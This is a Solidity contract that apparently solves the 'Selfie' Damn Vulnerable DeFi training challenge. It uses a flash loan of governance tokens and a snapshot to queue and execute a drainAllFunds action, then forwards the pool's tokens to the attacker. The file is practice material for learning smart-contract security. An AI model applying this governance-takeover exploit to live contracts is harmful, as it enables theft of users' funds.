// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SimpleGovernance.sol";

contract SelfieAttacker {
    SelfiePool selfiePool;
    DamnValuableTokenSnapshot damnValuableToken;
    SimpleGovernance simpleGovernance;
    address attacker;
    address selfiePoolAddress;
    uint256 actionId;

    constructor(
        address _selfiePoolAddress,
        address dvtAddress,
        address governanceAddress,
        address _attacker
    ) {
        selfiePool = SelfiePool(_selfiePoolAddress);
        damnValuableToken = DamnValuableTokenSnapshot(dvtAddress);
        simpleGovernance = SimpleGovernance(governanceAddress);
        attacker = _attacker;
        selfiePoolAddress = _selfiePoolAddress;
    }

    function receiveTokens(address token, uint256 amount) external {
        damnValuableToken.snapshot();
        damnValuableToken.transfer(selfiePoolAddress, amount);
        actionId = simpleGovernance.queueAction(
            selfiePoolAddress,
            abi.encodeWithSignature("drainAllFunds(address)", address(this)),
            0
        );
    }

    function flashLoan() public {
        selfiePool.flashLoan(damnValuableToken.balanceOf(selfiePoolAddress));
    }

    function takePool() public {
        simpleGovernance.executeAction(actionId);
        damnValuableToken.transfer(
            attacker,
            damnValuableToken.balanceOf(address(this))
        );
    }
}
